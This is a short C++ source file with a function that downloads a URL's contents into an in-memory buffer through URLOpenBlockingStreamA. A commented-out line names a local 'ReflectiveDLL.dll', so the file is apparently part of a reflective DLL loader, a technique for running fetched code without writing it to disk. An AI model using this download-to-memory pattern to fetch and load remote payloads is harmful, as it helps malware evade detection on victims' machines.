#include "download.h"
#include <iostream>

std::vector<char> download_from_url(_in_ const char* url)
{

    IStream* stream;
    std::vector<char> buffer;

    //DeleteUrlCacheEntry(L"http://127.0.0.1/ReflectiveDLL.dll");
    if (URLOpenBlockingStreamA(0, url, &stream, 0, 0)) {

        std::cout << "[-] Error occured while downloading the file";

        return buffer;
    }

    buffer.resize(100);

    unsigned long bytes_read;
    int total_bytes = 0;

    while (true) {
        stream->Read(buffer.data() + buffer.size() - 100, 100, &bytes_read);
        if (0U == bytes_read)
        {
            break;
        }

        buffer.resize(buffer.size() + 100);
        total_bytes += bytes_read;
    }

    stream->Release();
    buffer.erase(buffer.begin() + total_bytes, buffer.end());

    return buffer;
}
